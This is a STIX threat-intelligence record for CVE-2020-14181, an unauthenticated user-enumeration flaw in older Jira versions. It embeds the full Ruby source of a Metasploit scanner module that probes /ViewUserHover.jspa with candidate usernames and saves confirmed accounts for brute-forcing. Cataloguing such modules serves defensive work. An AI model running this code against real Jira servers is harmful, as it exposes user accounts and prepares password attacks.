{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d2f99664-ce82-4654-a76b-61825d2c664f",
    "created": "2024-08-14T16:31:01.925003Z",
    "modified": "2024-08-14T16:31:01.925007Z",
    "name": "Jira Users Enumeration",
    "description": " This module exploits an information disclosure vulnerability that allows an unauthenticated user to enumerate users in the /ViewUserHover.jspa endpoint. This only affects Jira versions < 7.13.16, 8.0.0 \u2264 version < 8.5.7, 8.6.0 \u2264 version < 8.11.1 Discovered by Mikhail Klyuchnikov @__mn1__ This module has been tested on versions 8.4.1, 8.5.6, 8.10.1, 8.11.0 ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/jira_user_enum.rb",
            "external_id": "jira_user_enum.rb"
        },
        {
            "source_name": "reference",
            "url": "https://jira.atlassian.com/browse/JRASERVER-71560"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-14181"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  include Msf::Auxiliary::Scanner\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Jira Users Enumeration',\n        'Description' => %q{\n          This module exploits an information disclosure vulnerability that allows an\n          unauthenticated user to enumerate users in the /ViewUserHover.jspa endpoint.\n          This only affects Jira versions < 7.13.16, 8.0.0 \u2264 version < 8.5.7, 8.6.0 \u2264 version < 8.11.1\n          Discovered by Mikhail Klyuchnikov @__mn1__\n          This module has been tested on versions 8.4.1, 8.5.6, 8.10.1, 8.11.0\n        },\n        'Author' => [\n          'Brian Halbach', # msf module author\n          'Mikhail Klyuchnikov' # initial discovery and PoC\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['URL', 'https://jira.atlassian.com/browse/JRASERVER-71560'],\n          ['CVE', '2020-14181']\n        ],\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'SideEffects' => [ IOC_IN_LOGS ],\n          'Reliability' => []\n        },\n        'DisclosureDate' => '2020-08-16'\n      )\n    )\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'Jira Path', '/']),\n      ]\n    )\n    deregister_options('PASS_FILE', 'USERPASS_FILE', 'USER_AS_PASS', 'STOP_ON_SUCCESS', 'BLANK_PASSWORDS', 'DB_ALL_CREDS', 'DB_ALL_PASS', 'PASSWORD')\n  end\n\n  def base_uri\n    @base_uri ||= normalize_uri(\"#{target_uri.path}/secure/ViewUserHover.jspa\")\n  end\n\n  def do_user_enum(user)\n    print_status(\"Checking user '#{user}'\")\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => base_uri,\n      'vars_get' => { 'username' => user },\n      'headers' => { 'Connection' => 'Close' }\n    )\n\n    unless res\n      print_error('No Response From Server')\n      return :abort\n    end\n\n    if res.body.include?('User does not exist')\n      print_bad(\"User '#{user}' does not exist\")\n    elsif res.body.include?('<a id=\"avatar-full-name-link\"') # this works for 8.4.1 not sure about other versions\n      connection_details = {\n        module_fullname: fullname,\n        username: user,\n        workspace_id: myworkspace_id,\n        status: Metasploit::Model::Login::Status::UNTRIED\n      }.merge(service_details)\n      create_credential_and_login(connection_details)\n\n      print_good(\"User exists: '#{user}'\")\n      @users_found << user\n    end\n  end\n\n  def run_host(_ip)\n    @users_found = []\n\n    print_status(\"Begin enumerating users at #{vhost}#{base_uri}\")\n    each_user_pass do |user, _pass|\n      next if user.empty?\n\n      do_user_enum(user)\n    end\n\n    if @users_found.empty?\n      print_status(\"#{full_uri} - No users found.\")\n    else\n      print_good(\"#{@users_found.length} Users found: #{@users_found.sort.join(', ')}\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-08-16"
}